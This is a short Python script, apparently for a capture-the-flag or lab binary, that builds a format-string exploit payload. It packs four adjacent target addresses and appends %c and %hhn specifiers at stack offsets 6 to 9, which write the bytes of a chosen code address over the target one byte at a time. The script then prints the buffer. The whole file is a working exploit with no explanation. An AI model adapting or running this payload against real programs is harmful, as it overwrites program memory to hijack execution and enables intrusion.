#! /usr/bin/env python
# coding: utf-8

import sys
import struct
from subprocess import Popen

tgt_addr = 0x80499e0
dst_addr = 0x8048691
off_set = 6

ef = (0x91 - 16) % 256
be = (0x86 - 16 - ef) % 256
ad = (0x04 - 16 - ef - be) % 256
de = (0x08 - 16 - ef - be - ad) % 256



buf = (struct.pack('<I', tgt_addr))      # \xef
buf += (struct.pack('<I', tgt_addr + 1)) # \xbe
buf += (struct.pack('<I', tgt_addr + 2)) # \xad
buf += (struct.pack('<I', tgt_addr + 3)) # \xde

buf += bytes("%"+str(ef)+"c%6\$hhn")
buf += bytes("%"+str(be)+"c%7\$hhn")
buf += bytes("%"+str(ad)+"c%8\$hhn")
buf += bytes("%"+str(de)+"c%9\$hhn")
 
print(buf)